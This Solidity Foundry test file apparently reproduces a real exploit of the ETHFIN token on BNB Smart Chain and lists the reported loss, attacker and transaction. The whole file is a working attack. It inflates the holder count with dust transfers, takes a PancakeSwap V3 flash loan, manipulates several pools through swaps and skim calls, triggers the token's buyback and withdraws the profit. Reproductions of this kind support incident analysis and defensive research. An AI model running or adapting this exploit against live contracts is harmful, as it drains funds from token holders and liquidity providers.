// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$1.24K (2.13 BNB)
// Attacker : https://bscscan.com/address/0x52e38d496f8d712394d5ed55e4d4cdd21f1957de
// Attack Contract : https://bscscan.com/address/0x11bfd986299bb0d5666536e361f312198e882642
// Vulnerable Contract : https://bscscan.com/address/0x17bd2e09fa4585c15749f40bb32a6e3db58522ba
// Attack Tx : https://bscscan.com/tx/0xfe031685d84f3bae1785f5b2bd0ed480b87815c3f23ce6ced73b8573b7e367c6

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x17bd2e09fa4585c15749f40bb32a6e3db58522ba#code

// @Analysis
// Post-mortem : 
// Twitter Guy : 
// Hacking God : 
pragma solidity ^0.8.0;

interface IETHFIN {
    function N_holders() external view returns (uint256);
    function NextBuybackMemberCount() external view returns (uint256);
    function transfer(address, uint) external;
}

interface IPancakePool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IETHFINToken {
    function doBuyback() external returns (bool);
}

contract ETHFIN is BaseTestWithBalanceLog {
    address wbnbAddress = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    IWBNB wbnb = IWBNB(payable(wbnbAddress));

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    address router_address = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    Uni_Router_V2 router = Uni_Router_V2(payable(router_address));

    address ethfin = 0x17Bd2E09fA4585c15749F40bb32a6e3dB58522bA;
    IERC20 ethfinToken = IERC20(ethfin);

    address pancakeV3Pool = 0x172fcD41E0913e95784454622d1c3724f546f849;

    address eftoken = 0xA964a6dab034A4b5985603f7e86a596c7e0eA96e;
    IERC20 ef_token = IERC20(eftoken);

    address pancakeSwap = 0x2b73Ee230dB9d7ddB51B859a3B59Ce48eB5aB4D9; //ethfin-finsimp
    address pancakeSwap2 = 0x168FDb7C2d4249485836595c8576D8f2D7c53a46; //ethfin-ethfin
    address pancakeSwap3 = 0x3544DA62afB297b5cE9DA14845C89b96D376D98C; //ethfin-wbnb


    function setUp() external {
        cheats.createSelectFork("bsc", 37400485-1);
        deal(address(ethfinToken), address(this), 1500); // initial tokens
    }

    function testExploit() external {
        uint256 init = address(this).balance;
        uint256 holders = IETHFIN(ethfin).N_holders();
        uint256 next_buy_back_member = IETHFIN(ethfin).NextBuybackMemberCount();
        uint160 base = 501;
        // weird loop
        while (holders <= next_buy_back_member) {
            IETHFIN(ethfin).transfer(address(base), 1);
            holders = IETHFIN(ethfin).N_holders();
            base++;
        }
        IPancakePool(pancakeV3Pool).flash(address(this), 0, 12000000000000000000, abi.encode(0x000000000000000000000000172fcd41e0913e95784454622d1c3724f546f849));
        uint256 after_attack = address(this).balance;
        emit log_named_decimal_uint("Attacker BNB end exploited", after_attack-init, 18);
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        wbnb.approve(router_address, type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = wbnbAddress;
        path[1] = eftoken;
        uint256[] memory amounts = router.swapTokensForExactTokens(543357312592081354942659827, 12000000000000000000, path, pancakeSwap, block.timestamp + 120);
        IPancakePair(pancakeSwap).skim(eftoken);

        
        uint256[] memory amounts2 = router.swapTokensForExactTokens(10, wbnb.balanceOf(address(this)), path, pancakeSwap2, block.timestamp + 120);
        path[1] = ethfin;
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(wbnb.balanceOf(address(this))-1000, 0, path, pancakeSwap2, block.timestamp + 120);
        IPancakePair(pancakeSwap2).skim(address(this));
        
        bool status = IETHFINToken(ethfin).doBuyback();
        require(status, "Buyback failed");

        path[1] = eftoken;
        uint256[] memory amounts3 = router.swapTokensForExactTokens(10, wbnb.balanceOf(address(this)), path, pancakeSwap2, block.timestamp + 120);
        uint256 ethfin_balance = ethfinToken.balanceOf(address(this));
        IERC20(ethfin).transfer(pancakeSwap2, ethfin_balance);
        IPancakePair(pancakeSwap2).skim(pancakeSwap3);

        address[] memory path2 = new address[](2);
        path2[0] = ethfin;
        path2[1] = wbnbAddress;
        uint256[] memory amounts_out = router.getAmountsOut(ethfin_balance, path2);
        IPancakePair(pancakeSwap3).swap(0, amounts_out[1], address(this), "");

        wbnb.transfer(pancakeV3Pool,12001200000000000000);
        wbnb.withdraw(wbnb.balanceOf(address(this)));
    }


    fallback() external payable {}
}
